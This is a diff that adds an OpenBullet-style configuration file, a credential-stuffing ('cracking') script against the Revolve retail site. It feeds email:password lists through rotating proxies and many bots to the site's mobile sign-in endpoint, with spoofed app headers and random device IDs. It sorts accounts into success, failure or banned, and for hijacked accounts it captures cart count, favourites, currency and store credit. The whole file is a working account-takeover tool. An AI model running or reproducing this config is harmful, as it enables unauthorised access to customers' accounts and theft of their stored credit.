@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "CreatorLK": "MD-18cbcadd9572c5bd6b8c9f757d869730-MaDKEY",
+  "Name": "REVOLVE",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-03T12:39:39.6963262+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Doberman (mth Encrypted)",
+  "Version": "1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 10,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "OffScreen": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var guid = uuidv4();
+END SCRIPT -> VARS "guid"
+BEGIN SCRIPT JavaScript
+function uuidv5() {
+  return '4xxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 8 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(8);
+  });
+}
+var random = uuidv5();
+END SCRIPT -> VARS "random"
+
+REQUEST GET "https://www.revolve.com/r/ajax/SignIn.jsp?deviceType=revolveandroidphone&email=<USER>&idfa=<guid>&isCheckout=true&appVersion=6.9.1&pw=<PASS>&iphoneId=<random>&userEmail=<USER>" 
+  
+  HEADER "x-newrelic-id: VgECU1FXGwIIUlBaAgYB" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A530F Build/LMY48Z)" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid e-mail and/or password" 
+    KEY "Please enter a valid e-mail address" 
+  KEYCHAIN Ban OR 
+    KEY "We are sorry, but we have detected too many incorrect" 
+  KEYCHAIN Success OR 
+    KEY "{\"msg4\":\"" 
+    KEY "\",\"success\":true" 
+
+PARSE "<SOURCE>" JSON "heartItemCount" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Favorites" 
+
+PARSE "<SOURCE>" JSON "cartCount" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Cart" 
+
+PARSE "<SOURCE>" JSON "currency" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Currency" 
+
+REQUEST GET "https://www.revolve.com/r/MyCredit.jsp" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" CSS ".storebalance span" "innerHTML" CreateEmpty=FALSE -> CAP "Store Credit" 
+
